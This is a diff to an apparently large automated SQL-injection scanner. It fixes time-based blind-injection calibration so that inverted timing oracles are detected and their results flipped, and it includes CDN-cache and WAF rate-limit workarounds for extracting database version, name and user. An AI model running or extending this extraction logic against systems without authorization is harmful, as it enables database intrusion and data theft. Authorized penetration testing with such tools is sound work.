@@ -55988,9 +55988,16 @@ class Scanner:
             # Prefer calibrations with REAL responses (ms > 30) over dead ones.
             _both_real = ms_true > 30 and ms_false > 30
             _best_both_real = _best_ms_t > 30 and _best_ms_f > 30
+            # BUG-CAL-INVERTED-POLARITY FIX: use abs() for margin comparison so that a
+            # large NEGATIVE margin (inverted oracle: FALSE→slow, TRUE→fast) is correctly
+            # preferred over a small negative or positive one.  The old `_m > _best_margin`
+            # comparison always picked the least-negative value, discarding the strongest
+            # inverted signal (e.g. -10293ms rejected in favour of -92ms which is then
+            # below the minimum viable threshold → extraction aborted).
+            # Also break early on large absolute margins regardless of sign.
             _is_better = (
                 (_both_real and not _best_both_real) or
-                (_both_real == _best_both_real and _m > _best_margin)
+                (_both_real == _best_both_real and abs(_m) > abs(_best_margin))
             )
             if _is_better:
                 _best_margin = _m
@@ -55998,7 +56005,7 @@ class Scanner:
                 _best_ms_f = ms_false
                 _best_fp_t = fp_true
                 _best_fp_f = fp_false
-            if _m >= 30:
+            if abs(_m) >= 30:
                 break
             await asyncio.sleep(3)
 
@@ -56379,7 +56386,14 @@ class Scanner:
 
         _try_bitwise_deferred = False
         _oracle_fragile = False  # BUG-UNBOUND-ORACLE-FRAGILE FIX: initialize here so line ~60183 is always bound regardless of whether _try_bitwise_deferred fires
-        if _margin < 30:
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs() here too. When _margin is a large
+        # NEGATIVE value (inverted oracle, e.g. -10293ms), we do NOT need arithmetic
+        # template rewrites — the signal is strong, just polarity-flipped.  Entering
+        # the arithmetic template block would overwrite _margin with near-zero values
+        # from the rewritten (non-working) template, discarding the original strong
+        # inverted signal and sending dozens of extra probes for no benefit.
+        # abs(_margin) < 30 correctly skips this block only when the signal is weak.
+        if abs(_margin) < 30:
             # WHERE-based template failed  WAF likely blocks WHERE keyword.
             # But first: check if timing oracle is dead (TRUE time far below expected sleep).
             _expected_sleep_ms = _delay * 1000
@@ -56682,7 +56696,30 @@ class Scanner:
         # In this case the timing oracle is UNRELIABLE; skip it and require a boolean
         # oracle (header, body, status) before attempting character extraction.
         _min_viable_margin = max(80.0, _delay * 1000 * 0.80)
-        _timing_oracle_reliable = (_margin >= _min_viable_margin) or _boolean_oracle
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs(_margin) so a large negative margin
+        # (inverted timing oracle: FALSE→slow, TRUE→fast) is accepted as reliable.
+        # Previously, a margin of -10293ms was rejected as < 80ms minimum despite being
+        # a 10-second inverted signal that is completely usable after polarity detection.
+        _timing_oracle_reliable = (abs(_margin) >= _min_viable_margin) or _boolean_oracle
+        # BUG-CAL-INVERTED-POLARITY FIX: detect timing oracle polarity inversion here,
+        # for the path where the timing oracle IS reliable but _margin < 0.
+        # When _margin << 0 (e.g. -10293ms), the injection template causes:
+        #   TRUE condition → fast (no sleep or IF(cond,0,SLEEP(N)))
+        #   FALSE condition → slow (SLEEP fires)
+        # The raw timing oracle (ms >= _thresh) returns True for slow probes, meaning
+        # it returns True for FALSE SQL conditions and False for TRUE conditions —
+        # inverted polarity.  Setting _oracle_inverted=True causes the _eval() wrapper
+        # (defined below) to flip every True/False result, restoring correct polarity.
+        # Clear _eval_cache so stale non-inverted results cannot be replayed.
+        if (_timing_oracle_reliable and not _boolean_oracle
+                and _margin <= -_min_viable_margin):
+            # _eval_cache is defined later at line ~59975; no entries yet so no clear needed.
+            _oracle_inverted = True
+            print(f"[!] [Inference] Inverted timing oracle detected (margin={_margin:.0f}ms): "
+                  "TRUE→fast, FALSE→slow — activating polarity inversion",
+                  flush=True)
+            LOG.info("[Inference] Inverted timing oracle: margin=%.0fms, _oracle_inverted=True "
+                     "(extraction will flip all oracle results)", _margin)
         if _timing_oracle_reliable and not _boolean_oracle:
             # BUG-CDN-STEP-DELAY-PRIMARY-CAL FIX: CDN-lock detection was only in floor cal.
             # When primary calibration passes (margin ≥ 80ms), _cdn_step_delay stays 0.0
@@ -56692,10 +56729,15 @@ class Scanner:
             # ~180ms), CDN is likely warming up for extraction probes even when the first
             # CDN-cold calibration probe gave a good margin. Set 10s inter-step delay.
             _cdn_lock_est = 180.0  # estimated CDN-lock speed (ms); typical Cloudflare
-            if ms_false > 0 and ms_false < _cdn_lock_est + 50:
+            # BUG-CAL-INVERTED-POLARITY FIX: For a normal oracle (margin>0), ms_false is
+            # the fast (no-sleep) side. For an inverted oracle (margin<0), ms_true is the
+            # fast side. Check whichever side is the non-sleep side for CDN caching.
+            _cdn_fast_ms = ms_true if _oracle_inverted else ms_false
+            if _cdn_fast_ms > 0 and _cdn_fast_ms < _cdn_lock_est + 50:
                 _cdn_step_delay = 10.0
+                _cdn_side = "true" if _oracle_inverted else "false"
                 print(f"[!] [Inference] CDN-lock detected in calibration"
-                      f" (false={ms_false:.0f}ms ≈ CDN-lock ~{_cdn_lock_est:.0f}ms)"
+                      f" ({_cdn_side}={_cdn_fast_ms:.0f}ms ≈ CDN-lock ~{_cdn_lock_est:.0f}ms)"
                       f" — adding {_cdn_step_delay:.0f}s inter-step delay to force"
                       " CDN-cold probes. Extraction will be slow (~10s/bit).",
                       flush=True)
@@ -56840,7 +56882,9 @@ class Scanner:
                                      "TRUE=%.0fms FALSE=%.0fms margin=%.0fms",
                                      _rcal+1, _ms_fr_t, _ms_fr_f, _rm)
                             # Reject cache/dedup hits (< 30ms), same as primary calibration
-                            if _ms_fr_t > 30 and _ms_fr_f > 30 and _rm > _retry_margin:
+                            # BUG-CAL-INVERTED-POLARITY FIX: use abs() so inverted-oracle
+                            # floor margins (large negative) are preferred over weak positive ones.
+                            if _ms_fr_t > 30 and _ms_fr_f > 30 and abs(_rm) > abs(_retry_margin):
                                 _retry_margin = _rm
                                 _retry_ms_t, _retry_ms_f = _ms_fr_t, _ms_fr_f
                         except Exception:
@@ -56848,7 +56892,8 @@ class Scanner:
                         await asyncio.sleep(2)
                     LOG.info("[Inference] Floor calibration: TRUE=%.0fms FALSE=%.0fms margin=%.0fms",
                              _retry_ms_t, _retry_ms_f, _retry_margin)
-                    if _retry_margin >= _min_viable_margin_floor:
+                    # BUG-CAL-INVERTED-POLARITY FIX: use abs() for floor margin acceptance check.
+                    if abs(_retry_margin) >= _min_viable_margin_floor:
                         _margin = _retry_margin
                         ms_true, ms_false = _retry_ms_t, _retry_ms_f
                         _thresh = (ms_true + ms_false) / 2
@@ -56874,9 +56919,13 @@ class Scanner:
                         # (compare to floor sleep which should give ~500ms for TRUE)
                         _expected_true_ms = _delay_floor * 1000 + (ms_false if ms_false > 0 else 200)
                         _cdn_step_delay = 0.0
-                        if _retry_ms_t < _thresh * 0.7 or (
+                        # BUG-CAL-INVERTED-POLARITY FIX: for inverted oracle (TRUE→fast, FALSE→slow),
+                        # the TRUE probe is always fast — that's expected, not CDN caching.
+                        # Skip CDN detection when _retry_margin < 0 (inverted oracle).
+                        # For standard oracle, check if TRUE side looks unexpectedly fast (CDN-cached).
+                        if _retry_margin >= 0 and (_retry_ms_t < _thresh * 0.7 or (
                             _retry_ms_t < _expected_true_ms * 0.6 and _retry_margin < 50
-                        ):
+                        )):
                             # Round TRUE looks CDN-cached → set inter-step CDN wait
                             _cdn_step_delay = 10.0
                             print(f"[!] [Inference] CDN-lock in floor calibration "
@@ -57377,10 +57426,12 @@ class Scanner:
             # Sending another probe here just gives CDN a chance to return a cached response
             # below threshold (e.g. CASE: TRUE=352ms FALSE=153ms margin=198ms accepted,
             # then confirm probe hits CDN cache at 135ms < threshold → False → rejected).
-            if _margin >= _min_viable_margin:
+            # BUG-CAL-INVERTED-POLARITY FIX: use abs() so inverted-oracle calibrations
+            # (large negative margin) also satisfy this early-return guard.
+            if abs(_margin) >= _min_viable_margin:
                 LOG.info("[Inference] Template confirmed by calibration "
-                         "(margin=%.0fms ≥ min=%.0fms)  skipping re-test",
-                         _margin, _min_viable_margin)
+                         "(|margin|=%.0fms ≥ min=%.0fms)  skipping re-test",
+                         abs(_margin), _min_viable_margin)
                 return True
             # When both boolean oracle and timing reliability flags were set together
             # (e.g. by baseline-similarity oracle), the oracle was already validated —
@@ -59440,6 +59491,20 @@ class Scanner:
                     return True   # clearly in True range (consistent with r1)
                 if ms1 < min(_thresh, _ms_false_est * 1.10):
                     return False  # clearly in False range (consistent with r1)
+            # BUG-CAL-INVERTED-POLARITY FIX: fast-path for inverted timing oracle.
+            # For inverted oracle (TRUE→fast, FALSE→slow, _margin < 0):
+            #   ms_true_est = _thresh + _margin/2  (small — the fast side)
+            #   ms_false_est = _thresh - _margin/2 (large — the slow side)
+            # Fast True: ms1 < ms_true_est * 1.10 (well below threshold → definitely True)
+            # Fast False: ms1 >= ms_false_est * 0.90 (well above threshold → definitely False)
+            # Clamp to _thresh so fast-path never contradicts r1 (same guard as standard path).
+            elif not _boolean_oracle and _margin < 0:
+                _ms_true_est_inv  = _thresh + _margin / 2.0   # small (fast side)
+                _ms_false_est_inv = _thresh - _margin / 2.0   # large (slow side)
+                if ms1 < min(_thresh, _ms_true_est_inv * 1.10):
+                    return True   # clearly in fast/True range for inverted oracle
+                if ms1 >= max(_thresh, _ms_false_est_inv * 0.90):
+                    return False  # clearly in slow/False range for inverted oracle
 
             await asyncio.sleep(_delay)
             r2 = await _eval(cond)
@@ -59480,7 +59545,9 @@ class Scanner:
         # Fix: call _extract_multi here — after oracle confirmation and before the
         # deferred-bitwise fallback — to run the main binary-search extraction for
         # version, database, and user using the confirmed timing oracle.
-        if _dbms_confirmed or _margin >= _min_viable_margin:
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs() so strong inverted-oracle margins
+        # (large NEGATIVE values) satisfy the _min_viable_margin check.
+        if _dbms_confirmed or abs(_margin) >= _min_viable_margin:
             _INF_VQ = {
                 "PostgreSQL":  "SELECT version()",
                 "CockroachDB": "SELECT version()",
@@ -59718,7 +59785,9 @@ class Scanner:
                     # On non-injectable targets or boolean-only extractions, all responses
                     # are uniformly fast (CDN cache), producing low spread that mimics
                     # rate-limiting but isn't.
-                    _timing_active = _margin > 30 and not _boolean_oracle
+                    # BUG-CAL-INVERTED-POLARITY FIX: use abs() so rate-limit detection
+                    # fires for inverted oracles (where _margin is large and negative).
+                    _timing_active = abs(_margin) > 30 and not _boolean_oracle
                     if _timing_active:
                         _waf_consecutive_identical += 1
                     else:
@@ -59918,17 +59987,22 @@ class Scanner:
             await asyncio.sleep(_delay)
             _, ms_f = await _send_payload(_cal_false_cond)
             _m = ms_t - ms_f
-            if 0 < _m < _original_margin * 0.4 and not _boolean_oracle:
+            # BUG-CAL-INVERTED-POLARITY FIX: use abs() so signal-quality checks and
+            # threshold updates work for inverted oracles (where _m and _original_margin
+            # are both negative — abs() gives the true signal strength in either polarity).
+            _abs_m = abs(_m)
+            _abs_orig = abs(_original_margin)
+            if 0 < _abs_m < _abs_orig * 0.4 and not _boolean_oracle:
                 LOG.warning("[Inference] Signal degraded: margin=%.0fms (was %.0fms)  increasing delay", _m, _original_margin)
                 _delay = min(_delay * 1.5, 15.0)
-            if _m > 30:
+            if _abs_m > 30:
                 _thresh = (ms_t + ms_f) / 2
                 # Also update _margin so _eval_confirm fast-path stays accurate.
                 # Previous code only updated _thresh — _eval_confirm derives fast-True
                 # and fast-False bands from both _thresh AND _margin, so a stale
                 # _margin after recalibration shifts the bands and misses fast-True.
                 _margin = _m
-            return _m > 30
+            return _abs_m > 30
 
         #  ENHANCEMENT: Request caching 
         # Cache conditionresult pairs so the same query isn't sent twice
@@ -61419,7 +61493,9 @@ class Scanner:
                     _new_f = statistics.median(_false_times[-10:])
                     _new_thresh = (_new_t + _new_f) / 2
                     _new_margin = _new_t - _new_f
-                    if _new_margin > 30:
+                    # BUG-CAL-INVERTED-POLARITY FIX: use abs() so adaptive recalibration
+                    # also fires for inverted oracles (where _new_margin is negative).
+                    if abs(_new_margin) > 30:
                         _thresh = _new_thresh
                         LOG.info("[Inference] Recalibrated: thresh=%.0fms (margin=%.0fms)", _thresh, _new_margin)
 
@@ -61857,7 +61933,8 @@ class Scanner:
             self.session.data.get("banner") or
             self.session.data.get("current_db")
         )
-        if not _r7_have_data and not _oracle_fragile and (_dbms_confirmed or _margin >= _min_viable_margin or _boolean_oracle):
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs() so strong inverted-oracle margins satisfy the check.
+        if not _r7_have_data and not _oracle_fragile and (_dbms_confirmed or abs(_margin) >= _min_viable_margin or _boolean_oracle):
             LOG.info(
                 "[Inference] BUG7-RETRY: re-running extraction now that all functions are defined "
                 "(boolean_oracle=%s hdr=%s margin=%.0fms bitwise_fallback=%s)",
@@ -64222,7 +64299,16 @@ class Scanner:
         _body_gap = abs(_body_calib_t - _body_calib_f)
         _use_bool_body_oracle = False
 
-        if _margin < 80:
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs() so inverted-oracle margins
+        # (large NEGATIVE values, e.g. TRUE=390ms FALSE=10683ms → margin=-10293ms)
+        # do NOT incorrectly activate the body-diff fallback.
+        # Also detect inverted polarity for the timing path.
+        _d_oracle_inverted = False
+        if _margin <= -80:
+            _d_oracle_inverted = True
+            LOG.info("[Direct] Inverted timing oracle detected (margin=%.0fms): "
+                     "TRUE→fast, FALSE→slow — activating polarity inversion", _margin)
+        if abs(_margin) < 80:
             # Require body gap to be meaningful relative to page size.
             # 50B absolute was far too low: dynamic pages show ±200-500B variation per-request
             # (timestamps, session tokens, counters). Require ≥1% of page size AND ≥200B
@@ -64244,7 +64330,7 @@ class Scanner:
 
         if not _use_bool_body_oracle:
             _thresh = (ms_t + ms_f) / 2
-            LOG.info("[Direct] Viable! thresh=%.0fms delay=%.1fs", _thresh, _delay)
+            LOG.info("[Direct] Viable! thresh=%.0fms delay=%.1fs (inverted=%s)", _thresh, _delay, _d_oracle_inverted)
         _de_cdn_step_delay = 0.0  # Reactive retry in _send_d_timed handles CDN automatically
 
         async def _eval_d(cond):
@@ -64266,7 +64352,9 @@ class Scanner:
                 fp, ms = await _send_d_timed(p)
             if fp is None or ms < 30:
                 return None
-            return ms >= _thresh
+            # BUG-CAL-INVERTED-POLARITY FIX: flip result for inverted-oracle detection templates.
+            _raw = ms >= _thresh
+            return (not _raw) if _d_oracle_inverted else _raw
 
         _dbms = getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or "MySQL"
 
